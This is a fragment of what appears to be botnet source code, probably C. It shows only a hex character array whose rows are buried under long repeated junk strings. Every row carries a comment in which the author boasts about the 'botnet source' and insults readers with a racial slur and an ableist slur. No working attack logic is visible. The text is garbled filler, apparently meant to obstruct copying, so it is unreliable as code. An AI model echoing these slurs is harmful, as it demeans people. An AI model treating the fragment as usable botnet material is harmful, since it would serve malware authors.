GGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY 